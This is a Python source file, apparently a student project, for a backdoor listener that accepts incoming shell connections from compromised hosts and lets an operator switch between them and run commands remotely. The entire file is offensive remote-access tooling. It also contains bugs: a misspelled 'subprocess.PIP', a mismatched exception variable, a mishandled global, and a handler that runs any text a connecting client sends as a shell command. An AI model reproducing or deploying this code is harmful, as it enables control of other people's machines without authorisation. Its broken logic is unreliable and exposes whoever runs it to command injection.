"""
William Boylin
wdb1631@rit.edu
"""

import socket
import subprocess
import threading
import select
import os
import sys
import time


def execute_on_host(client_socket, command):
	"""
	executes a command on a target client socket
	"""

	# handle logic for closing shells
	if command.lower() == "exit":
		print(f"closing connection to {client_socket.getpeername()}")
		client_socket.send(b"exit\n")
		clients.remove(client_socket)
		client_socket.close()
		return -1

	# send the command encoded with a new line at the end
	client_socket.send(command.encode() + b'\n')

	# set the socket to time out after waiting on receives
	client_socket.settimeout(0.1)

	# loop receiving until theres nothing else to receive
	# all received text is put into a single string
	output = b""
	while True:
		try:
			response = client_socket.recv(4096)
			output += response
		except TimeoutError:
			break

	# print the response
	output = output.decode()
	print(output, end='')


def start_server(host, port):
	"""
	starts a socket to listen and accept incoming backdoor connections
	"""

	# create socket and bind it to localhost
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((host,port))

	# make server listen for incoming connections
	server.listen(5)
	print(f"listening on {host}:{port}")

	# loop receiving incoming connections
	while True:
		client_socket, client_address = server.accept()
		#print(f"connection from {client_address}")
		new_host = True

		# only accept 1 connection at a time from a given host
		# this prevents the server from being spammed with many shells
		for client in clients:
			if client.getpeername()[0] == client_address[0]:
				# close sockets if a connection for the host already exists
				new_host = False
				client_socket.close()
				break

		# handle communication with a new host
		if new_host:
			print(f"\n(!) connection from {client_address}")
			if not in_shell:
				print("\nserver>", end='')
			clients.append(client_socket)

			# create a new thread for the new host
			client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
			client_thread.start()
			client_threads.append(client_thread)




def handle_client(client_socket, client_address):
	"""
	handles communication with a client
	"""

	# set up a pipe for each client, this helps make shell switching work better
	client_pipes[client_socket] = os.pipe()

	# loop reading from pipe and sending commands to client
	try:
		while True:
			# read pipe and send output
			output = os.read(client_pipes[client_socket][0], 1024)
			if output:
				client_socket.send(output)

			# receive data from the client
			rlist, _, _ = select.select([client_socket], [], [], 1.0)
			if rlist:
				data = client_socket.recv(1024)
				if data:
					if data.strip() == b"exit":
						client_socket.send(b"closing connection\n")
						break
					else:
						process = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIP, stderr=subprocess.PIP)
						stdout, stderr = process.communicate()
						client_socket.send(stdout + stderr)

	except Exception as E:
		print(f"Error in {client_address}: {e}")

	# close clients and pipes when they are done
	finally:
		client_socket.close()
		clients.remove(client_socket)
		del client_pipes[client_socket]
		print(f"\nclosed connection to {client_address}")


def print_shells():
	"""
	prints the currently available hosts
	"""

	# print if there's no available hosts
	if len(clients) == 0:
		print("no available shells")

	# loop through hosts and print them
	for i, client in enumerate(clients):
		print(f"{i+1}: client {client.getpeername()}")

def shell_switcher():
	"""
	allows switching between client shells
	"""

	# wait to let server thread get started
	time.sleep(0.3)

	print("Server started, type 'help' for list of commands")

	# loop to allow user to control shells
	while True:
		try:
			# prompt user for input
			choice = input("\nserver> ")

			# print help
			if choice == "help" or choice == "h":
				print("\nshells\t\t-\tprint available shells\n[number]\t-\tconnect to specified shell\nquit/exit\t-\tclose server\n")

			# command to print available shells
			elif choice == "shells" or choice == "s":
				print_shells()


			# command to close server
			elif choice == "quit" or choice == "exit":
				leave = input("Are you sure you want to exit? (y/n)")
				if leave.lower() == "y":
					print("exiting")
					break

			# command to switch to a selected shell
			elif choice.isdigit():
				choice = int(choice)

				# switch shell
				if 1 <= choice <= len(clients):
					in_shell = True
					client = clients[choice - 1]
					print(f"\ninteracting with {client.getpeername()}")
					print("\ttype 'leave' to exit session")
					print("\ttype 'exit' to close session")
					print("\nhost>", end='')

					# loop taking commands to put in shell
					while True:
						command = input()

						# command to leave shell without closing the connection
						if command.lower() == "leave" or command.lower() == "l":
							print("leaving client shell and returning to server")
							in_shell = False
							break

						# run the command on the host and exit if requested
						output = execute_on_host(client, command)
						if output == -1:
							break

			# invalid command case
			else:
				print("invalid choice, try again")
		except Exception as e:
			print(f"Error: {e}")
			break



if __name__ == "__main__":

	# default server values
	host = '0.0.0.0'
	port = 9999

	# default port arguments
	if len(sys.argv) == 1:
		print("no port specified, using default port 9999")

	# user specified port
	elif sys.argv[1] == "-p":
		try:
			if sys.argv[2].isdigit():
				port = int(sys.argv[2])
			else:
				print("Invalid port number")
				print("exiting")
				exit()
		except IndexError:
			print("Please specify a port")
			print("exiting")
			exit()


	# keep track of clients
	clients = []
	client_threads = []
	client_pipes = {}

	# start server socket
	server_thread = threading.Thread(target=start_server, args=(host,port))
	server_thread.daemon = True
	server_thread.start()

	in_shell = False

	# start shell switcher
	shell_switcher()
